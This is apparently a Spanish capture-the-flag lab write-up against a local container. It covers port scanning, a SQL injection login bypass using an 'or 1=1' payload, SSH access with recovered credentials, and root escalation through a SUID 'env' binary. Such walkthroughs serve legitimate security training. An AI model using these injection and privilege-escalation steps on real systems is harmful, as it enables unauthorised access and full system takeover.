# Etapa de Reconocimiento

## Nmap

### 1.er Escaneo

Usamos la herramienta *nmap* para descubrir servicios que puedan estar corriendo.
```ruby
nmap -p- --open --min-rate 5000 -sS -vvv 172.17.0.2 -n -Pn -oG allPorts
```

#### Parámetros del Escaneo

 `-p-` Escaneo de todo rango de puertos
 
 `--open` Filtrar solo por los puertos abiertos
 
 `--min-rate 5000` No permitir paquetes más lentos que 5000p/s
 
 `-sS` Usar el método TCP-SYN
 
 `-vvv` Ver la información en tiempo real
 
 `172.17.0.2` La IP
 
 `-n` No aplicar resolución DNS
 
 `-Pn` Deshabilitar el descubrimiento de Host
 
 `-oG allPorts` Exportar el escaneo en formato Grepeable

#### Output
Vemos que la máquina tiene abierto los puertos *22,80*, en los que concuerdan los servicios *SSH y HTTP*.
```ruby
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

## Reconocimiento WEB
### Whatweb
Usaremos el binario *whatweb $url* para ver información detallada de los servicios que puedan estar corriendo por detrás.
```ruby
whatweb http://172.17.0.2
```

Vemos que tiene una *PasswordField* y el título de la página es *Iniciar Sesión*, podemos intuir que tiene algún login.
```ruby
http://172.17.0.2 [200 OK] Apache[2.4.52], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], PasswordField[password], Title[Iniciar Sesión]
```

### Vista de la WEB
Vemos que sí tiene un login.

![](../../images/Pasted%20image%2020240601180703.png)

# Explotación
## SQLi
Al tener un login, lo primero que se prueba es un *SQLi* para intentar evadir el login.

![](../../images/Pasted%20image%2020240601181435.png)

En el campo USER vamos a insertar `${texto}' or 1=1;`, lo que queremos es que el resultado de la petición sea *True*:

Nosotros ahora estamos enviando esta petición:
`SELECT * FROM Users WHERE User = ${texto}' or 1=1;` (Por ejemplo)

Vemos que va a comprobar si hay un usuario que sea existente con el nombre *${texto}*, seguramente no, pero luego va a comprobar si *1=1*, en este caso sí.

La primera es *falsa* y la segunda es *verdadera*:

*falso* **or** *verdadero* = *verdadero*

Nos permite la evasión del login.

## SSH
Vemos un *Usuario* y una *Contraseña*, por lo tanto, intentaremos entrar por *ssh* (Servicio que sabemos que está corriendo).

![](../../images/Pasted%20image%2020240601183040.png)

Usamos *sshpass* para no tener que introducir la contraseña luego.

![](../../images/Pasted%20image%2020240601183504.png)

**¡¡Tenemos acceso al sistema!!**

### Tratamiento de la TTY

Es muy recomendable hacer un tratamiento de la TTY para poder hacer *[ ^L ]*, *[ ^C ]*, etc.
```ruby
script /dev/null -c bash
```

```ruby
stty raw -echo; fg
```

```ruby
[^Z]
```

```ruby
reset xterm
```

```ruby
export SHELL=bash && export TERM=xterm
```

## Escalada de Privilegios

### Búsqueda de Vulnerabilidades

Vamos a probar a buscar ficheros con *SUID* y usuario propietario *root*.
```ruby
find / -perm -4000 -user root 2>/dev/null
```

```r
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/env
/usr/bin/gpasswd
```

De todos los binarios, el **env** es vulnerable si tiene el *SUID*.

Se puede ver fácilmente en: https://gtfobins.github.io/gtfobins/env/

### Root
En esta misma página nos indica como podemos escalar privilegios con este binario:
```r
env /bin/bash -p
```
![](../../images/Pasted%20image%2020240601185157.png)

**¡¡Ya tenemos privilegios ROOT!!**